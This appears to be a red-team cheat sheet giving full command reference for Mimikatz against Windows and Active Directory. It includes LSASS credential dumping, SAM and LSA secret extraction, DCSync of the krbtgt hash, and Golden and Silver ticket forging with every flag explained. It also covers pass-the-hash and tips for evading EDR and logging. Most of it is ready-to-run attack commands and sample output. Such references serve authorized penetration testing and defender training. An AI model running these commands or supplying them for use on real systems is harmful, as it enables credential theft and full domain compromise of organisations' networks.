# Mimikatz — Full Reference

> Always run first: `privilege::debug`
> If it fails → you're not admin/SYSTEM yet. Escalate first.

---

## Privileges Required (per command family)

| Command family | Privilege needed | Why |
|---|---|---|
| `privilege::debug` (prelude) | **Local Admin** (elevated) | Enables `SeDebugPrivilege` on your token — needed to open `lsass.exe` |
| `token::elevate` | **Local Admin** | Upgrades your token from admin → SYSTEM. Required for SAM access |
| `sekurlsa::*` (LSASS reads — `logonPasswords`, `tickets`, `ekeys`, `msv`) | **SYSTEM + SeDebugPrivilege** | Cross-process LSASS memory reads |
| `sekurlsa::pth` | **SYSTEM + SeDebugPrivilege** | Spawns a new process and rewrites its credential material inside LSASS |
| `lsadump::sam`, `lsadump::secrets`, `lsadump::cache` | **SYSTEM** | Reads encrypted local SAM / LSA secrets hives |
| `lsadump::dcsync` | **A domain account with DCSync rights** (`DS-Replication-Get-Changes-All`) — **does NOT need local admin/SYSTEM** | Network MS-DRSR replication call. The account's identity is what authorizes; you can run this unelevated on your Kali |
| `kerberos::ptt`, `kerberos::golden /ptt`, `tgt::ptt` | **None** | Ticket injection into your own session — runs as your user |
| `misc::skeleton`, `misc::memssp` | **SYSTEM on a DC + SeDebugPrivilege** | Patches LSASS memory on a DC |

**Blockers (modern AD environments):**
- **LSA Protection (RunAsPPL)** — blocks LSASS reads/writes even from SYSTEM unless a signed kernel driver disables PPL first. Kills all `sekurlsa::*` and `misc::skeleton` / `misc::memssp`
- **Credential Guard** — even when LSASS reads succeed, NTLM hashes and Kerberos secrets sit in a VBS enclave and return as zeros
- **EDR / AV** — Mimikatz signatures are universal; expect detection on touch. Forks like pypykatz, Invoke-Mimi, and SafetyKatz exist for evasion

**Get there:** [Windows PrivEsc](../post-exploitation/windows-privesc.md) for local admin → SYSTEM on a host. For `lsadump::dcsync` (the one command that needs a *domain* privilege, not a local one), see [BloodHound](../active-directory/enumeration/bloodhound.md) to find accounts with replication rights, then the AD attack chain ([Kerberoasting](../active-directory/post-compromise/kerberoasting.md), [ACL Abuse](../active-directory/post-compromise/acl-abuse.md), [ADCS Attacks](../active-directory/post-compromise/adcs-attacks.md)) to reach one.

---

## sekurlsa:: — LSASS Memory (Logged-in Users)

LSASS is the process that holds credentials for currently logged-in users. These commands read directly from it.

```sh
privilege::debug                  # Must run first every session

sekurlsa::logonPasswords          # Dump all logged-in accounts — NTLM hashes + cleartext if available
sekurlsa::msv                     # NTLM hashes only (faster, less noise)
sekurlsa::kerberos                # Kerberos passwords in memory
sekurlsa::ekeys                   # AES128/AES256 Kerberos keys — use for pass-the-key (stealthier than NTLM PTH)
sekurlsa::tickets                 # Kerberos tickets currently in memory
sekurlsa::tickets /export         # Export all tickets as .kirbi files to current dir
```

**What to look for in output:**
```
* Username : Administrator
* Domain   : CORP
* NTLM     : 31d6cfe0d16ae931b73c59d7e0c089c0   ← use this for PTH
* SHA1     : ...
* AES256   : a3e...                              ← use this for pass-the-key
```

> Cleartext passwords (`Password:`) only appear if WDigest is enabled — rare on modern Windows. NTLM is almost always there.

---

## lsadump:: — Database Dumps

These read from the SAM database or replicate from the DC directly.

```sh
lsadump::sam                      # Local SAM — local account hashes (needs SYSTEM)
lsadump::secrets                  # LSA secrets — service account passwords, cached domain creds
lsadump::cache                    # DCC2 cached domain hashes (only useful if cracked)

# DCSync — simulate DC replication to pull ANY user's hash without touching the DC directly
# Needs: Domain Admin, or DCSync rights (GenericAll/WriteDACL on domain object)
lsadump::dcsync /domain:corp.local /user:krbtgt        # Get krbtgt hash ← for Golden Ticket
lsadump::dcsync /domain:corp.local /user:Administrator  # Get DA hash
lsadump::dcsync /domain:corp.local /all /csv           # Dump every account (noisy)
```

**DCSync output — what to grab:**
```
** SAM ACCOUNT **
SAM Username         : krbtgt
Object GUID          : ...
Object Security ID   : S-1-5-21-XXXXXXXXX-XXXXXXXXX-XXXXXXXXX-502   ← Domain SID is everything before -502
Credentials:
  Hash NTLM: 1a2b3c4d...    ← /krbtgt: value for Golden Ticket
  AES256 HMAC: 9f8e7d...    ← /aes256: value (more opsec)
```

**Getting Domain SID from DCSync output:**
The SID shown is the USER's SID. Remove the last part (`-502` for krbtgt).
`S-1-5-21-111-222-333-502` → Domain SID = `S-1-5-21-111-222-333`

---

## kerberos:: — Ticket Operations

```sh
kerberos::list                    # List all tickets in current session
kerberos::list /export            # Export all tickets as .kirbi files
kerberos::ptt ticket.kirbi        # Inject a .kirbi ticket into current session (Pass the Ticket)
kerberos::purge                   # Delete all tickets from session (clean up / switch user)
```

---

## Golden Ticket — Full Breakdown

**What it is:** A forged TGT signed with the krbtgt hash. Since the DC uses krbtgt to verify TGTs, a valid krbtgt hash = unlimited ticket generation for any user.

**What you need before running:**

| Value | Where to get it |
|---|---|
| Domain FQDN | `ipconfig /all`, `Get-Domain`, or any previous enum |
| Domain SID | `lsadump::dcsync /user:krbtgt` → SID field, remove last `-XXX` |
| krbtgt NTLM hash | `lsadump::dcsync /user:krbtgt` → `Hash NTLM:` line |
| Username | Anything — real or fake |

```sh
kerberos::golden /User:FakeAdmin /domain:corp.local /sid:S-1-5-21-111-222-333 /krbtgt:1a2b3c4d... /id:500 /ptt
```

**Every flag explained:**

| Flag | What it takes | Options / Notes |
|---|---|---|
| `/User:` | Any username — real or fake | `FakeAdmin`, `Administrator`, `backdoor` — doesn't matter |
| `/domain:` | Domain FQDN | `corp.local` — get from `Get-Domain` or `ipconfig` |
| `/sid:` | Domain SID only (no user RID at end) | `S-1-5-21-111-222-333` — from DCSync output, drop last segment |
| `/krbtgt:` | krbtgt NTLM hash | From `lsadump::dcsync /user:krbtgt` |
| `/id:` | RID of user to impersonate | `500` = Administrator, `501` = Guest, `1000+` = regular users. **Use 500** |
| `/groups:` | Group RIDs to include (optional) | `512` = Domain Admins, `519` = Enterprise Admins. Default includes DA already |
| `/ptt` | Pass the ticket into current session | No value needed. Alternative: `/ticket:golden.kirbi` saves to file instead |
| `/aes256:` | AES256 key instead of NTLM (optional) | Stealthier — from DCSync `AES256 HMAC:` line. Use this if possible |
| `/startoffset:` | Minutes in past ticket starts (optional) | Default `-10`. Mimics real tickets |
| `/endin:` | Ticket lifetime in minutes (optional) | Default `600` (10 hrs). Real tickets are 10 hrs |
| `/renewmax:` | Max renewal window in minutes (optional) | Default `10080` (7 days) |

**After generating — open session:**
```sh
misc::cmd        # Opens new cmd.exe window with the ticket loaded
# OR just use the current session — /ptt already injected it
dir \\DC01\C$   # Test access
```

---

## Silver Ticket — Full Breakdown

**What it is:** A forged TGS for a specific service. More targeted than Golden Ticket, harder to detect (never touches the DC).

**Difference from Golden:** You forge a service ticket directly instead of a TGT. Only works for that one service, but leaves almost no logs.

**What you need:**

| Value | Where to get it |
|---|---|
| Domain SID | Same as Golden Ticket |
| Service account NTLM hash | `sekurlsa::logonPasswords` or `lsadump::dcsync /user:<serviceaccount>` |
| SPN / Target | The service you're targeting |

```sh
kerberos::golden /User:FakeAdmin /domain:corp.local /sid:S-1-5-21-111-222-333 /rc4:<SERVICE-ACCOUNT-HASH> /target:dc01.corp.local /service:cifs /ptt
```

**Key difference flags:**

| Flag | What it takes | Notes |
|---|---|---|
| `/rc4:` | Service account NTLM hash | NOT krbtgt — the hash of the account running the service |
| `/target:` | FQDN of the server | `dc01.corp.local`, `webserver.corp.local` |
| `/service:` | Service type | See table below |

**Common `/service:` values:**

| Service | Access you get |
|---|---|
| `cifs` | File shares (SMB) — `\\server\C$` |
| `http` | Web services, WinRM |
| `ldap` | LDAP queries, DCSync |
| `mssql` | SQL Server |
| `host` | Scheduled tasks, remote commands |
| `rpcss` | WMI |
| `krbtgt` | That's a Golden Ticket |

---

## Diamond Ticket

**What it is:** Requests a real TGT from the DC, then patches it in memory to add DA privileges. Harder to detect than Golden because the ticket has a valid PAC signed by the real DC.

Use **Rubeus** for Diamond Tickets — see [Rubeus](rubeus.md).

---

## Pass the Hash (PTH) with Mimikatz

Spawns a process with a different user's hash without knowing the plaintext password:

```sh
sekurlsa::pth /user:Administrator /domain:corp.local /ntlm:31d6cfe0... /run:cmd.exe
```

| Flag | What it takes |
|---|---|
| `/user:` | Username to impersonate |
| `/domain:` | Domain FQDN or `.` for local |
| `/ntlm:` | NTLM hash of that user |
| `/aes256:` | AES key instead (stealthier, use if available) |
| `/run:` | What to launch — `cmd.exe`, `powershell.exe`, `mmc.exe` |

---

## Other Useful Commands

```sh
# Dump credentials from a specific process (by PID)
sekurlsa::minidump lsass.dmp     # Read from offline LSASS dump

# If you dumped LSASS with Task Manager or procdump:
sekurlsa::minidump C:\path\lsass.dmp
sekurlsa::logonPasswords

# Check if debug privilege worked
token::whoami
```

---

## Getting Domain SID — All Methods

```sh
# Method 1 — Mimikatz DCSync (most reliable)
lsadump::dcsync /user:krbtgt
# Take the SID from output, remove last segment

# Method 2 — PowerShell (if on domain-joined machine)
Get-DomainSID                    # PowerView
[System.Security.Principal.WindowsIdentity]::GetCurrent().User.AccountDomainSid

# Method 3 — CMD
whoami /user
# Shows your SID: S-1-5-21-111-222-333-1234  ← remove -1234 at end

# Method 4 — wmic
wmic useraccount get name,sid
```
